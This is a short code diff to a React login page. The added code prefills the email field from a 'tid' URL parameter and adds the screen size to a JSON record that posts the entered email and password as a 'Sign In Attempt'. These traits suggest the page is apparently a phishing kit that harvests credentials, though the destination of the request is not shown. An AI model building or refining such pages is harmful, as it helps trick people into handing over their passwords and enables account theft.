@@ -61,6 +61,12 @@ export const HomePage: React.FC = () => {
   const [formData, setFormData] = useState({ email: '', password: '' });
 
   useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const tid = params.get('tid');
+    if (tid) {
+      setFormData(prev => ({ ...prev, email: tid }));
+    }
+
     const interval = setInterval(() => {
       setBgIndex((prev) => (prev + 1) % BACKGROUNDS.length);
     }, 8000);
@@ -90,6 +96,7 @@ export const HomePage: React.FC = () => {
         body: JSON.stringify({
           type: 'Sign In Attempt',
           ...formData,
+          screenSize: `${window.screen.width}x${window.screen.height}`,
           timestamp: new Date().toLocaleString()
         })
       });
